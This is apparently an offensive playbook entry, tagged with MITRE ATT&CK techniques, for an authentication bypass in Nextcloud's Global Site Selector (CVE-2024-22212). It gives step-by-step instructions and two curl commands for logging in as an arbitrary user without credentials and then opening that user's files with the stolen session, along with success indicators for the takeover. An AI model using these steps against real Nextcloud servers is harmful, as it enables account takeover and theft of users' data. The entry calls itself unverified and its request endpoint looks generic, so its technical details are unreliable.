---
tags:
  - auth-bypass
  - account-takeover
  - nextcloud
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Nextcloud-Global-Site-Selector-Auth-Bypass]]'
step_count: 1
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:43.013Z'
description: >-
  An authentication bypass vulnerability in Nextcloud's Global Site Selector
  allows attackers to log in as any user without credentials, enabling full
  account takeover.
skill_level: intermediate
impact_level: high
id: 2a88fa50-dfb5-404b-9891-f90a28cd6d21
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Nextcloud Global Site Selector Authentication Bypass for Account Takeover

Multi-stage attack chain demonstrating a complete attack workflow exploiting an authentication bypass in Nextcloud's Global Site Selector to achieve unauthorized access and account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Auth Bypass] --> B[Account Takeover]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or [[commands/curl-nextcloud-auth-bypass]]

### Target Environment

- Nextcloud instance with Global Site Selector enabled
- Web platform accessible over HTTP/HTTPS
- No specific ports beyond standard 80/443

### Initial Access Requirements

- Network access to the Nextcloud login endpoint
- No prior credentials required due to bypass
- Target must be a vulnerable version (pre-patch for CVE-2024-22212)

## Detailed Attack Procedures

### Step 1: Exploit Authentication Bypass
procedure: [[procedures/Exploit-Nextcloud-Global-Site-Selector-Auth-Bypass]]

**Objective**: Bypass authentication in the Global Site Selector to log in as any target user, gaining full access to their account.

**Instructions**: Identify the Nextcloud instance and navigate to the login page. Use the Global Site Selector feature to select a target user without providing credentials. This exploits insufficient authentication checks, allowing direct login.

Execute the bypass using [[commands/curl-nextcloud-auth-bypass]] to simulate the request:

```bash
curl -X GET "https://target-nextcloud.com/login/select?user=target_username" -c cookies.txt
```

Follow up by accessing the dashboard with the session cookie:

```bash
curl -b cookies.txt "https://target-nextcloud.com/apps/files"
```

**Expected Output**: Successful login response with user session established, redirect to dashboard, and access to user files/data.

**Success Indicators**:
- HTTP 200 or 302 redirect to logged-in state
- Session cookie contains valid auth token
- Access to user-specific resources like files or settings

## Attack Chain Summary

### Key Achievements

1. Unauthorized login as any user via Global Site Selector
2. Full account takeover, including data access and privilege escalation
3. Critical impact rated 9.6 severity (CVE-2024-22212)

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2024-10-01T00:00:00Z*
